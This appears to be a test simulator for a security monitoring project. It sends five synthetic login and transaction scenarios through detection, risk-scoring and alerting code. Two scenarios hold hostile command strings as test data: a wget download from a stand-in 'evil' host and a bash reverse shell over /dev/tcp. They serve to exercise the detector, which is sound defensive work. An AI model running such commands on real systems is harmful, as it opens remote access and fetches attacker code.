"""

Fires 5 synthetic scenarios through the full pipeline:
  activity_detector → risk_engine → alert_handler → SQLite

"""

import sys
from pathlib import Path

#for  making sure project root is on the path
ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from engine.activity_detector import analyse
from engine.transaction_scorer import score as tx_score
from engine.risk_engine import evaluate
from alerts.alert_handler import dispatch

SCENARIOS = [
    {
        "name": "🟢 Normal login",
        "activity": {
            "username": "alice",
            "ip_address": "10.0.0.1",
            "timestamp": "2024-11-01T09:00:00",
            "failed_logins": 0,
            "command": "ls -la",
        },
        "transaction": {
            "account_id": "alice",
            "amount": 250.00,
            "currency": "ZAR",
            "location": "Johannesburg",
            "last_location": "Johannesburg",
            "device_id": "device_trusted",
            "known_devices": ["device_trusted"],
            "recent_tx_count": 1,
            "timestamp": "2024-11-01T09:00:00",
        },
    },
    {
        "name": "🟡 Off-hours access",
        "activity": {
            "username": "bob",
            "ip_address": "10.0.0.2",
            "timestamp": "2024-11-01T02:30:00",
            "failed_logins": 2,
            "command": "git pull",
        },
        "transaction": {
            "account_id": "bob",
            "amount": 500.00,
            "currency": "ZAR",
            "location": "Cape Town",
            "last_location": "Cape Town",
            "device_id": "device_bob",
            "known_devices": ["device_bob"],
            "recent_tx_count": 1,
            "timestamp": "2024-11-01T02:30:00",
        },
    },
    {
        "name": "🟠 Suspicious activity",
        "activity": {
            "username": "charlie",
            "ip_address": "203.0.113.99",
            "timestamp": "2024-11-01T03:15:00",
            "failed_logins": 7,
            "command": "wget http://evil.sh",
        },
        "transaction": {
            "account_id": "charlie",
            "amount": 800.00,
            "currency": "ZAR",
            "location": "Durban",
            "last_location": "Durban",
            "device_id": "device_charlie",
            "known_devices": ["device_charlie"],
            "recent_tx_count": 1,
            "timestamp": "2024-11-01T03:15:00",
        },
    },
    {
        "name": "🟠 Large transaction + new device",
        "activity": {
            "username": "dave",
            "ip_address": "10.0.0.5",
            "timestamp": "2024-11-01T14:00:00",
            "failed_logins": 0,
            "command": "ls",
        },
        "transaction": {
            "account_id": "dave",
            "amount": 45000.00,
            "currency": "ZAR",
            "location": "Lagos",
            "last_location": "Johannesburg",
            "device_id": "unknown_device_xyz",
            "known_devices": ["device_dave_phone"],
            "recent_tx_count": 5,
            "timestamp": "2024-11-01T14:00:00",
        },
    },
    {
        "name": "🔴 Full attack — brute force + fraud",
        "activity": {
            "username": "attacker",
            "ip_address": "45.33.32.156",
            "timestamp": "2024-11-01T01:45:00",
            "failed_logins": 12,
            "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        },
        "transaction": {
            "account_id": "attacker",
            "amount": 99000.00,
            "currency": "ZAR",
            "location": "Moscow",
            "last_location": "Johannesburg",
            "device_id": "hacked_device",
            "known_devices": [],
            "recent_tx_count": 8,
            "timestamp": "2024-11-01T01:45:00",
        },
    },
]


def run():
    print("\n" + "═" * 56)
    print("  SENTINEL SIMULATOR — 5 test scenarios")
    print("═" * 56)

    for i, scenario in enumerate(SCENARIOS, 1):
        print(f"\nScenario {i}/5: {scenario['name']}")
        activity_result    = analyse(scenario["activity"])
        transaction_result = tx_score(scenario["transaction"])
        result = evaluate(
            activity_result,
            transaction_result,
            context={"username": scenario["activity"]["username"]},
        )
        dispatch(result)

    print("\n" + "═" * 56)
    print("  Done. Check your dashboard at http://localhost:3000")
    print("═" * 56 + "\n")


if __name__ == "__main__":
    run()